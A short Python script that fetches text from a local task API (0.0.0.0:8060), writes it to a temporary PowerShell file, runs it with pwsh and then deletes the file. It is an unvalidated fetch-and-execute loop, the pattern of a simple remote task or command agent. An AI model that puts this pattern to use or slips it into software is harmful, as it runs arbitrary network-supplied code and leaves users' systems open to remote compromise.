import requests
import json
import os
import subprocess, sys

r = requests.get('http://0.0.0.0:8060/api/tasks/')
r2 = json.loads(r.text)
data = r2[0]["text"]
print(data)
try:
    with open('data.ps1', 'w') as f:
        f.write(data)

    p = subprocess.Popen(["pwsh","data.ps1"],stdout=sys.stdout)
    p.communicate()

finally:
    os.remove("data.ps1")